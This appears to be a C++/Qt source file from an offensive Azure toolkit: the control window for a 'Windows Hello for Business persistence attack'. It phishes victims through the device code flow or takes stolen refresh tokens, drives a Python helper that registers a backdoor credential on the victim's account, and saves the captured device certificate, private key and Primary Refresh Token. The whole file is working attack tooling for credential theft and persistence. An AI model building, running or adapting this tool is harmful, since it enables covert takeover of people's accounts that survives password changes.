#include "WHfBAttackWindow.h"
#include "StyleManager.h"
#include "UserSelectorWidget.h"
#include "TokenHelper.h"
#include "TokenStore.h"

#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QLabel>
#include <QGroupBox>
#include <QSplitter>
#include <QMessageBox>
#include <QFileDialog>
#include <QFile>
#include <QDir>
#include <QCoreApplication>
#include <QDateTime>
#include <QClipboard>
#include <QApplication>
#include <QScrollBar>

WHfBAttackWindow::WHfBAttackWindow(QWidget *parent)
    : QWidget(parent), pythonProcess(nullptr), attackRunning(false)
{
    setWindowTitle("Windows Hello for Business Attack");
    setAttribute(Qt::WA_DeleteOnClose);
    setupUi();
}

WHfBAttackWindow::~WHfBAttackWindow() {
    if (pythonProcess && pythonProcess->state() != QProcess::NotRunning) {
        pythonProcess->kill();
        pythonProcess->waitForFinished(3000);
    }
}

void WHfBAttackWindow::setupUi() {
    auto *mainLayout = new QVBoxLayout(this);

    // Info banner
    auto *infoLabel = new QLabel(
        "<b>Windows Hello for Business Persistence Attack</b><br>"
        "<span style='color: #ff9800;'>This attack registers a WHfB credential on the victim's account, "
        "creating a persistent backdoor that survives password changes.</span><br>"
        "<span style='color: gray;'>Requires: Python 3, roadtools, msal, cryptography libraries</span>",
        this);
    infoLabel->setWordWrap(true);
    infoLabel->setStyleSheet("background-color: #1a1a2e; padding: 10px; border-radius: 5px;");
    mainLayout->addWidget(infoLabel);

    // Token input group
    auto *tokenGroup = new QGroupBox("Token Input (Optional - skip Device Code if provided)", this);
    auto *tokenLayout = new QVBoxLayout(tokenGroup);

    // User selector for auto-fetch
    userSelector = new UserSelectorWidget(this);
    tokenLayout->addWidget(userSelector);
    connect(userSelector, &UserSelectorWidget::userChanged, this, &WHfBAttackWindow::onUserChanged);
    connect(userSelector, &UserSelectorWidget::logMessage, this, &WHfBAttackWindow::appendLog);

    auto *autoFetchRow = new QHBoxLayout();
    autoFetchBtn = new QPushButton("Auto-Fetch Broker Token for Selected User", this);
    StyleManager::applyPrimaryStyle(autoFetchBtn);
    autoFetchRow->addWidget(autoFetchBtn);
    autoFetchRow->addStretch();
    tokenLayout->addLayout(autoFetchRow);
    connect(autoFetchBtn, &QPushButton::clicked, this, &WHfBAttackWindow::autoFetchTokens);

    // Access token
    auto *accessLabel = new QLabel("Access Token (for Microsoft Authentication Broker):", this);
    tokenLayout->addWidget(accessLabel);
    accessTokenInput = new QTextEdit(this);
    accessTokenInput->setPlaceholderText("Paste access token here to skip device code flow...");
    accessTokenInput->setMaximumHeight(60);
    tokenLayout->addWidget(accessTokenInput);

    // Refresh token
    auto *refreshLabel = new QLabel("Refresh Token:", this);
    tokenLayout->addWidget(refreshLabel);
    refreshTokenInput = new QTextEdit(this);
    refreshTokenInput->setPlaceholderText("Paste refresh token here to skip device code flow...");
    refreshTokenInput->setMaximumHeight(60);
    tokenLayout->addWidget(refreshTokenInput);

    // Device name
    auto *deviceNameLayout = new QHBoxLayout();
    deviceNameLayout->addWidget(new QLabel("Custom Device Name (optional):", this));
    deviceNameInput = new QLineEdit(this);
    deviceNameInput->setPlaceholderText("e.g. DESKTOP-WHFB01 (random if empty)");
    deviceNameLayout->addWidget(deviceNameInput);
    tokenLayout->addLayout(deviceNameLayout);

    mainLayout->addWidget(tokenGroup);

    // Control buttons
    auto *controlLayout = new QHBoxLayout();

    startDeviceCodeBtn = new QPushButton("Start Device Code Flow", this);
    StyleManager::applySuccessStyle(startDeviceCodeBtn);
    startDeviceCodeBtn->setToolTip("Start a new device code phishing flow to capture tokens");

    startWithTokensBtn = new QPushButton("Start with Existing Tokens", this);
    startWithTokensBtn->setStyleSheet("QPushButton { background-color: #17a2b8; color: white; font-weight: bold; padding: 10px 20px; }");
    startWithTokensBtn->setToolTip("Use the tokens provided above (skip device code)");

    stopBtn = new QPushButton("Stop", this);
    stopBtn->setEnabled(false);

    controlLayout->addWidget(startDeviceCodeBtn);
    controlLayout->addWidget(startWithTokensBtn);
    controlLayout->addWidget(stopBtn);
    controlLayout->addStretch();

    copyBtn = new QPushButton("Copy Output", this);
    saveBtn = new QPushButton("Save Credentials", this);
    saveBtn->setEnabled(false);
    controlLayout->addWidget(copyBtn);
    controlLayout->addWidget(saveBtn);

    mainLayout->addLayout(controlLayout);

    // Status
    statusLabel = new QLabel("Ready", this);
    statusLabel->setStyleSheet("font-weight: bold; padding: 5px; background-color: #2d2d2d; border-radius: 3px;");
    mainLayout->addWidget(statusLabel);

    // Output log
    auto *outputGroup = new QGroupBox("Attack Output", this);
    auto *outputLayout = new QVBoxLayout(outputGroup);
    outputLog = new QTextEdit(this);
    outputLog->setReadOnly(true);
    outputLog->setStyleSheet("font-family: monospace; background-color: #1a1a1a;");
    outputLayout->addWidget(outputLog);
    mainLayout->addWidget(outputGroup);

    // Progress bar
    progressBar = new QProgressBar(this);
    progressBar->setVisible(false);
    progressBar->setRange(0, 0);  // Indeterminate
    mainLayout->addWidget(progressBar);

    // Connections
    connect(startDeviceCodeBtn, &QPushButton::clicked, this, &WHfBAttackWindow::startDeviceCodeFlow);
    connect(startWithTokensBtn, &QPushButton::clicked, this, &WHfBAttackWindow::startWithExistingTokens);
    connect(stopBtn, &QPushButton::clicked, this, &WHfBAttackWindow::stopAttack);
    connect(copyBtn, &QPushButton::clicked, this, &WHfBAttackWindow::copyOutput);
    connect(saveBtn, &QPushButton::clicked, this, &WHfBAttackWindow::saveCredentials);

    resize(900, 700);
}

void WHfBAttackWindow::appendLog(const QString &msg, const QString &color) {
    outputLog->append(QString("<span style='color:%1'>%2</span>").arg(color, msg.toHtmlEscaped()));
    outputLog->verticalScrollBar()->setValue(outputLog->verticalScrollBar()->maximum());
}

void WHfBAttackWindow::setLoading(bool loading) {
    progressBar->setVisible(loading);
    startDeviceCodeBtn->setEnabled(!loading);
    startWithTokensBtn->setEnabled(!loading);
    stopBtn->setEnabled(loading);
    autoFetchBtn->setEnabled(!loading);
    accessTokenInput->setEnabled(!loading);
    refreshTokenInput->setEnabled(!loading);
    deviceNameInput->setEnabled(!loading);
    attackRunning = loading;
}

QString WHfBAttackWindow::findPythonScript() {
    QStringList searchPaths = {
        QCoreApplication::applicationDirPath() + "/../helpers/DeviceCode2WFH.py",
        QCoreApplication::applicationDirPath() + "/../../helpers/DeviceCode2WFH.py",
        QDir::currentPath() + "/helpers/DeviceCode2WFH.py",
        "/home/dmcxblue/Documents/OffensiveTools/Azure/ANIMO/helpers/DeviceCode2WFH.py"
    };

    for (const QString &path : searchPaths) {
        QFileInfo fi(path);
        if (fi.exists()) {
            return fi.absoluteFilePath();
        }
    }

    return QString();
}

void WHfBAttackWindow::startDeviceCodeFlow() {
    QString scriptPath = findPythonScript();
    if (scriptPath.isEmpty()) {
        QMessageBox::critical(this, "Script Not Found",
            "Could not find DeviceCode2WFH.py script.\n"
            "Please ensure it exists in the helpers/ directory.");
        return;
    }

    outputLog->clear();
    appendLog("[*] Starting Device Code to Windows Hello for Business attack...", "cyan");
    appendLog("[*] Script: " + scriptPath, "gray");
    appendLog("[*] Waiting for victim to authenticate via device code...", "yellow");
    appendLog("", "white");

    launchPythonScript();
}

void WHfBAttackWindow::startWithExistingTokens() {
    QString accessToken = accessTokenInput->toPlainText().trimmed();
    QString refreshToken = refreshTokenInput->toPlainText().trimmed();

    if (accessToken.isEmpty() && refreshToken.isEmpty()) {
        QMessageBox::warning(this, "Missing Tokens",
            "Please provide at least a refresh token to skip the device code flow.");
        return;
    }

    QString scriptPath = findPythonScript();
    if (scriptPath.isEmpty()) {
        QMessageBox::critical(this, "Script Not Found",
            "Could not find DeviceCode2WFH.py script.\n"
            "Please ensure it exists in the helpers/ directory.");
        return;
    }

    outputLog->clear();
    appendLog("[*] Starting WHfB attack with existing tokens...", "cyan");
    appendLog("[*] Script: " + scriptPath, "gray");
    appendLog("", "white");

    launchPythonScript(accessToken, refreshToken);
}

void WHfBAttackWindow::launchPythonScript(const QString &accessToken, const QString &refreshToken) {
    setLoading(true);
    statusLabel->setText("Attack in progress...");
    statusLabel->setStyleSheet("font-weight: bold; padding: 5px; background-color: #b8860b; border-radius: 3px;");

    pythonProcess = new QProcess(this);

    connect(pythonProcess, &QProcess::readyReadStandardOutput, this, &WHfBAttackWindow::onProcessOutput);
    connect(pythonProcess, &QProcess::readyReadStandardError, this, &WHfBAttackWindow::onProcessError);
    connect(pythonProcess, QOverload<int, QProcess::ExitStatus>::of(&QProcess::finished),
            this, &WHfBAttackWindow::onProcessFinished);

    QString scriptPath = findPythonScript();
    QStringList args;
    args << scriptPath;

    // Set environment variables to pass tokens
    QProcessEnvironment env = QProcessEnvironment::systemEnvironment();
    if (!accessToken.isEmpty()) {
        env.insert("WHFB_ACCESS_TOKEN", accessToken);
    }
    if (!refreshToken.isEmpty()) {
        env.insert("WHFB_REFRESH_TOKEN", refreshToken);
    }
    QString deviceName = deviceNameInput->text().trimmed();
    if (!deviceName.isEmpty()) {
        env.insert("WHFB_DEVICE_NAME", deviceName);
    }

    pythonProcess->setProcessEnvironment(env);
    pythonProcess->setWorkingDirectory(QFileInfo(scriptPath).absolutePath());

    // Try python3 first, then python
    pythonProcess->start("python3", args);
    if (!pythonProcess->waitForStarted(3000)) {
        pythonProcess->start("python", args);
        if (!pythonProcess->waitForStarted(3000)) {
            appendLog("[-] Failed to start Python process. Ensure Python 3 is installed.", "red");
            setLoading(false);
            statusLabel->setText("Failed to start");
            statusLabel->setStyleSheet("font-weight: bold; padding: 5px; background-color: #dc3545; border-radius: 3px;");
            return;
        }
    }

    appendLog("[+] Python script started", "green");
}

void WHfBAttackWindow::stopAttack() {
    if (pythonProcess && pythonProcess->state() != QProcess::NotRunning) {
        appendLog("[!] Stopping attack...", "yellow");
        pythonProcess->terminate();
        if (!pythonProcess->waitForFinished(3000)) {
            pythonProcess->kill();
        }
    }
}

void WHfBAttackWindow::onProcessOutput() {
    if (!pythonProcess) return;

    QString output = QString::fromUtf8(pythonProcess->readAllStandardOutput());
    for (const QString &line : output.split('\n', Qt::SkipEmptyParts)) {
        // Color code based on content
        if (line.contains("[✔]") || line.contains("[+]") || line.contains("success", Qt::CaseInsensitive)) {
            appendLog(line, "lightgreen");
        } else if (line.contains("[*]") || line.contains("[i]")) {
            appendLog(line, "cyan");
        } else if (line.contains("❌") || line.contains("[-]") || line.contains("error", Qt::CaseInsensitive) || line.contains("failed", Qt::CaseInsensitive)) {
            appendLog(line, "red");
        } else if (line.contains("➡") || line.contains("Code:") || line.contains("Visit:")) {
            appendLog(line, "yellow");
        } else if (line.contains("Certificate") || line.contains("PRT")) {
            appendLog(line, "orange");
            // Try to capture credentials
            if (line.contains("Device Certificate:")) {
                capturedDeviceCert = "";  // Will be captured in subsequent lines
            } else if (line.contains("PRT Data:")) {
                capturedPRT = "";  // Will be captured in subsequent lines
            }
        } else {
            appendLog(line, "white");
        }

        // Capture multi-line credentials
        if (!capturedDeviceCert.isNull() && line.startsWith("-----")) {
            capturedDeviceCert += line + "\n";
            if (line.contains("END CERTIFICATE")) {
                saveBtn->setEnabled(true);
            }
        }
    }
}

void WHfBAttackWindow::onProcessError() {
    if (!pythonProcess) return;

    QString error = QString::fromUtf8(pythonProcess->readAllStandardError());
    for (const QString &line : error.split('\n', Qt::SkipEmptyParts)) {
        appendLog("[stderr] " + line, "red");
    }
}

void WHfBAttackWindow::onProcessFinished(int exitCode, QProcess::ExitStatus status) {
    setLoading(false);

    if (status == QProcess::CrashExit) {
        appendLog("[-] Python script crashed!", "red");
        statusLabel->setText("Script crashed");
        statusLabel->setStyleSheet("font-weight: bold; padding: 5px; background-color: #dc3545; border-radius: 3px;");
    } else if (exitCode != 0) {
        appendLog(QString("[-] Script exited with code %1").arg(exitCode), "yellow");
        statusLabel->setText("Completed with errors");
        statusLabel->setStyleSheet("font-weight: bold; padding: 5px; background-color: #ffc107; color: black; border-radius: 3px;");
    } else {
        appendLog("[+] Attack completed successfully!", "green");
        appendLog("[+] Check for device_cert.pem and device_key.key files", "green");
        appendLog("[+] PRT saved to quetzal.prt", "green");
        statusLabel->setText("Attack completed!");
        statusLabel->setStyleSheet("font-weight: bold; padding: 5px; background-color: #28a745; border-radius: 3px;");
        saveBtn->setEnabled(true);
    }

    pythonProcess->deleteLater();
    pythonProcess = nullptr;
}

void WHfBAttackWindow::autoFetchTokens() {
    if (!userSelector->hasSelection()) {
        appendLog("[-] Please select a user first", "red");
        return;
    }

    appendLog("[*] Loading session tokens for WHfB registration...", "cyan");

    // WHfB key registration needs the REFRESH token - the helper (DeviceCode2WFH.py)
    // exchanges it for the device-registration broker audience
    // (29d9ed98-a469-4536-ade2-f981bc1d605e) itself. Populate it from the session.
    const QString sid = userSelector->selectedSession();
    QString rt, tid, upn;
    if (TokenHelper::instance()->getRefreshTokenForSession(sid, rt, tid, upn) && !rt.isEmpty()) {
        refreshTokenInput->setPlainText(rt);
        appendLog("[+] Refresh token loaded (used for broker/DRS exchange)", "green");
    } else {
        appendLog("[!] No refresh token for this session - use the Device Code flow for broker access", "yellow");
    }

    // Also pull a Graph access token for context/enumeration.
    userSelector->fetchToken("https://graph.microsoft.com", [this](bool success, const QString &token, const QString &error) {
        if (success) {
            accessTokenInput->setPlainText(token);
            appendLog("[+] Access token acquired", "green");
        } else {
            appendLog(QString("[-] Failed to fetch access token: %1").arg(error), "red");
        }
    });
}

void WHfBAttackWindow::onUserChanged(const QString &upn) {
    appendLog(QString("[*] Switched to user: %1").arg(upn), "cyan");
}

void WHfBAttackWindow::copyOutput() {
    QApplication::clipboard()->setText(outputLog->toPlainText());
    appendLog("[+] Output copied to clipboard", "green");
}

void WHfBAttackWindow::saveCredentials() {
    QString dir = QFileDialog::getExistingDirectory(this, "Select Directory to Save Credentials",
        QDir::homePath());

    if (dir.isEmpty()) return;

    QString timestamp = QDateTime::currentDateTime().toString("yyyyMMdd_HHmmss");

    // Check for generated files in the script's working directory
    QString scriptDir = QFileInfo(findPythonScript()).absolutePath();

    QStringList filesToCopy = {"device_cert.pem", "device_key.key", "quetzal.prt"};
    int copied = 0;

    for (const QString &filename : filesToCopy) {
        QString srcPath = scriptDir + "/" + filename;
        if (QFile::exists(srcPath)) {
            QString destPath = dir + "/" + timestamp + "_" + filename;
            if (QFile::copy(srcPath, destPath)) {
                appendLog(QString("[+] Saved: %1").arg(destPath), "green");
                copied++;
            }
        }
    }

    if (copied > 0) {
        appendLog(QString("[+] Saved %1 credential files to %2").arg(copied).arg(dir), "green");
        QMessageBox::information(this, "Credentials Saved",
            QString("Saved %1 credential file(s) to:\n%2\n\n"
                    "Files:\n"
                    "- device_cert.pem: Device certificate\n"
                    "- device_key.key: Private key\n"
                    "- quetzal.prt: Primary Refresh Token").arg(copied).arg(dir));
    } else {
        appendLog("[-] No credential files found to save", "yellow");
        QMessageBox::warning(this, "No Files Found",
            "Could not find generated credential files.\n"
            "Make sure the attack completed successfully.");
    }
}

void WHfBAttackWindow::updateTokenStatus() {
    // Not used in this window but kept for interface consistency
}
